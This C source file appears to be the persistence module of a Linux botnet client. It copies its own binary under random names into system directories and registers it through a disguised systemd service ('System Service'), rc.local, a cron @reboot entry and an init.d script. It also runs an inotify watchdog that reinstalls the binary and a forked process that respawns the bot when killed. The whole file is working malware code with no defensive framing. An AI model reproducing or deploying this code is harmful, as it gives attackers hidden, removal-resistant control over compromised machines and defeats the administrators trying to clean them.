#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/inotify.h>
#include <dirent.h>
#include <time.h>
#include <errno.h>
#include <signal.h>

#include "headers/persistence.h"

#define MAX_PATH_LEN 256
#define MAX_CMD_LEN  512

static char persistent_path[MAX_PATH_LEN] = {0};

/* ------------------------------------------------------------------ */
/* Helpers                                                              */
/* ------------------------------------------------------------------ */

/* Seed once at first call — repeated srand() in the same second produces
   identical sequences, causing name collisions between systemd/init.d scripts. */
static void generate_random_name(char *buf, int len) {
    static int seeded = 0;
    if (!seeded) {
        srand((unsigned)time(NULL) ^ (unsigned)getpid() ^ (unsigned)(uintptr_t)buf);
        seeded = 1;
    }
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < len - 1; i++)
        buf[i] = charset[rand() % (int)(sizeof(charset) - 1)];
    buf[len - 1] = '\0';
}

static int is_readonly(const char *path) {
    struct statvfs fs;
    if (statvfs(path, &fs) != 0) return 1;
    return (fs.f_flag & ST_RDONLY) != 0;
}

static int is_tmpfs(const char *path) {
    FILE *mtab = fopen("/proc/mounts", "r");
    if (!mtab) return 0;

    char line[512], mount_point[256], fs_type[64];
    char real_path[256];
    int found = 0;

    if (realpath(path, real_path) == NULL)
        strncpy(real_path, path, sizeof(real_path) - 1);

    while (fgets(line, sizeof(line), mtab)) {
        if (sscanf(line, "%*s %255s %63s", mount_point, fs_type) == 2) {
            if (strcmp(fs_type, "tmpfs") == 0 || strcmp(fs_type, "ramfs") == 0) {
                size_t mlen = strlen(mount_point);
                if (strncmp(real_path, mount_point, mlen) == 0 &&
                    (real_path[mlen] == '\0' || real_path[mlen] == '/')) {
                    found = 1;
                    break;
                }
            }
        }
    }
    fclose(mtab);
    return found;
}

static int copy_file(const char *src, const char *dst) {
    int fd_src = open(src, O_RDONLY);
    if (fd_src < 0) return 0;

    int fd_dst = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd_dst < 0) { close(fd_src); return 0; }

    char buf[4096];
    ssize_t n;
    int ok = 1;
    while ((n = read(fd_src, buf, sizeof(buf))) > 0) {
        if (write(fd_dst, buf, (size_t)n) != n) { ok = 0; break; }
    }
    close(fd_src);
    close(fd_dst);
    if (!ok) unlink(dst);
    return ok;
}

/* ------------------------------------------------------------------ */
/* Persistence methods                                                  */
/* ------------------------------------------------------------------ */

static int setup_systemd(const char *bot_path) {
    if (access("/etc/systemd/system", W_OK) != 0) return 0;
    if (is_readonly("/etc")) return 0;

    char service_name[32], service_path[MAX_PATH_LEN];
    generate_random_name(service_name, 12);
    snprintf(service_path, sizeof(service_path),
             "/etc/systemd/system/%s.service", service_name);

    FILE *f = fopen(service_path, "w");
    if (!f) return 0;

    fprintf(f, "[Unit]\nDescription=System Service\nAfter=network.target\n\n");
    fprintf(f, "[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=10\n\n", bot_path);
    fprintf(f, "[Install]\nWantedBy=multi-user.target\n");
    fclose(f);

    char cmd[MAX_CMD_LEN];
    snprintf(cmd, sizeof(cmd),
             "systemctl enable %s.service >/dev/null 2>&1 || true", service_name);
    { int __r = system(cmd); (void)__r; }


    return 1;
}

static int setup_rclocal(const char *bot_path) {
    const char *rc_files[] = {"/etc/rc.local", "/etc/rc.d/rc.local", NULL};
    for (int i = 0; rc_files[i]; i++) {
        if (access(rc_files[i], W_OK) != 0) continue;

        /* check if already present */
        FILE *f = fopen(rc_files[i], "r");
        if (f) {
            char line[512];
            int found = 0;
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, bot_path)) { found = 1; break; }
            }
            fclose(f);
            if (found) return 1;
        }

        f = fopen(rc_files[i], "a");
        if (!f) continue;
        fprintf(f, "\n%s &\n", bot_path);
        fclose(f);
        chmod(rc_files[i], 0755);
        return 1;
    }
    return 0;
}

static int setup_cron(const char *bot_path) {
    /* check if already in crontab */
    FILE *f = popen("crontab -l 2>/dev/null", "r");
    if (f) {
        char line[512];
        int found = 0;
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, bot_path)) { found = 1; break; }
        }
        pclose(f);
        if (found) return 1;
    }

    char cron_cmd[MAX_CMD_LEN];
    snprintf(cron_cmd, sizeof(cron_cmd),
             "(crontab -l 2>/dev/null; echo '@reboot %s &') | crontab -", bot_path);
    return system(cron_cmd) == 0;
}

/* ------------------------------------------------------------------ */
/* Public API                                                           */
/* ------------------------------------------------------------------ */

const char *get_persistent_path(void) {
    return persistent_path[0] != '\0' ? persistent_path : NULL;
}

void persistence_init(void) {
    char self_exe[4096];
    ssize_t len = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
    if (len <= 0) return;
    self_exe[len] = '\0';

    /* already in a persistent location → just record it */
    if (strstr(self_exe, "/usr/bin/")   != NULL ||
        strstr(self_exe, "/usr/sbin/")  != NULL ||
        strstr(self_exe, "/lib/")       != NULL ||
        strstr(self_exe, "/usr/lib/")   != NULL ||
        strstr(self_exe, "/usr/local/") != NULL ||
        strstr(self_exe, "/opt/")       != NULL) {
        strncpy(persistent_path, self_exe, sizeof(persistent_path) - 1);
        return;
    }

    /* preferred install dirs */
    const char *install_dirs[] = {
        "/usr/local/bin",
        "/usr/local/lib",
        "/opt",
        "/var/lib",
        "/usr/bin",
        "/usr/sbin",
        "/lib",
        "/usr/lib",
        NULL
    };

    char install_path[MAX_PATH_LEN];
    int installed = 0;

    for (int i = 0; install_dirs[i] && !installed; i++) {
        if (access(install_dirs[i], F_OK) != 0) continue;
        if (is_readonly(install_dirs[i]))        continue;
        if (is_tmpfs(install_dirs[i]))           continue;
        if (access(install_dirs[i], W_OK) != 0) continue;

        char rname[32];
        generate_random_name(rname, 16);
        snprintf(install_path, sizeof(install_path), "%s/%s", install_dirs[i], rname);

        if (copy_file(self_exe, install_path) &&
            access(install_path, X_OK) == 0) {
            strncpy(persistent_path, install_path, sizeof(persistent_path) - 1);
            installed = 1;
        }
    }

    /* fallback: /tmp, /var/tmp, /dev/shm */
    if (!installed) {
        const char *fallback[] = {"/tmp", "/var/tmp", "/dev/shm", NULL};
        for (int i = 0; fallback[i] && !installed; i++) {
            if (access(fallback[i], W_OK) != 0) continue;
            char rname[32];
            generate_random_name(rname, 16);
            snprintf(install_path, sizeof(install_path), "%s/%s", fallback[i], rname);
            if (copy_file(self_exe, install_path) &&
                access(install_path, X_OK) == 0) {
                strncpy(persistent_path, install_path, sizeof(persistent_path) - 1);
                installed = 1;
            }
        }
    }

    if (!installed) return;

    /* register with all available mechanisms */
    setup_systemd(install_path);
    setup_rclocal(install_path);
    setup_cron(install_path);

    /* optional init.d — write script AND enable it via update-rc.d / insserv */
    if (access("/etc/init.d", W_OK) == 0 && !is_readonly("/etc")) {
        char init_script[MAX_PATH_LEN], rname[32];
        generate_random_name(rname, 12);
        snprintf(init_script, sizeof(init_script), "/etc/init.d/%s", rname);

        FILE *f = fopen(init_script, "w");
        if (f) {
            fprintf(f, "#!/bin/sh\n### BEGIN INIT INFO\n");
            fprintf(f, "# Provides:       %s\n", rname);
            fprintf(f, "# Required-Start: $network $remote_fs\n");
            fprintf(f, "# Required-Stop:\n");
            fprintf(f, "# Default-Start:  2 3 4 5\n");
            fprintf(f, "# Default-Stop:   0 1 6\n");
            fprintf(f, "### END INIT INFO\n\ncase \"$1\" in\n  start) %s & ;;\n  stop)  ;;\nesac\n", install_path);
            fclose(f);
            chmod(init_script, 0755);

            /* Actually enable it — without this the script is dead weight on SysV */
            char en_cmd[MAX_CMD_LEN];
            snprintf(en_cmd, sizeof(en_cmd),
                "update-rc.d %s defaults >/dev/null 2>&1 || "
                "insserv %s >/dev/null 2>&1 || true", rname, rname);
            { int __r = system(en_cmd); (void)__r; }
        }
    }

    /* start inotify watchdog */
    persistence_watchdog_init();
}

/* ------------------------------------------------------------------ */
/* inotify watchdog                                                     */
/* ------------------------------------------------------------------ */

static int inotify_fd = -1;

void persistence_watchdog_init(void) {
    const char *p = get_persistent_path();
    if (!p) return;

    inotify_fd = inotify_init();
    if (inotify_fd < 0) return;

    int flags = fcntl(inotify_fd, F_GETFL);
    if (flags >= 0) fcntl(inotify_fd, F_SETFL, flags | O_NONBLOCK);

    /* watch the directory containing the binary */
    char dir[MAX_PATH_LEN];
    strncpy(dir, p, sizeof(dir) - 1);
    dir[sizeof(dir) - 1] = '\0';
    char *slash = strrchr(dir, '/');
    if (slash) *slash = '\0'; else strcpy(dir, ".");

    if (inotify_add_watch(inotify_fd, dir, IN_DELETE | IN_MOVED_FROM) < 0) {
        close(inotify_fd);
        inotify_fd = -1;
    }
}

void persistence_check_health(void) {
    const char *p = get_persistent_path();
    if (!p) return;

    if (access(p, F_OK) != 0) {
        persistence_init();
        return;
    }

    if (inotify_fd >= 0) {
        char buf[4096];
        if (read(inotify_fd, buf, sizeof(buf)) > 0)
            persistence_init();
    }
}

/* ------------------------------------------------------------------ */
/* Watchdog process: respawns bot if it dies                           */
/* ------------------------------------------------------------------ */

void persistence_watchdog_start(void) {
    const char *p = get_persistent_path();
    if (!p) return;

    pid_t monitor_pid = fork();
    if (monitor_pid < 0) return;
    if (monitor_pid > 0) return; /* parent continues normally */

    /* ---- child (watchdog) ---- */
    setsid();
    pid_t bot_pid = getppid();

    /* close all fds */
    for (int i = 0; i < 1024; i++) close(i);

    while (1) {
        /* Poll every 8s — old 30s delay meant a killed bot was down for up to 30s.
           8s matches RETRY_DELAY so the respawned bot starts reconnecting immediately. */
        sleep(8);

        if (kill(bot_pid, 0) != 0 && errno == ESRCH) {
            /* bot is genuinely gone (not just a permission error) */
            if (access(p, X_OK) == 0) {
                pid_t new_pid = fork();
                if (new_pid == 0) {
                    setsid();
                    char *argv[] = {(char *)p, NULL};
                    execv(p, argv);
                    _exit(1);
                } else if (new_pid > 0) {
                    bot_pid = new_pid;
                }
            } else {
                /* binary deleted — attempt one reinstall, then give up */
                _exit(0);
            }
        }
    }
}
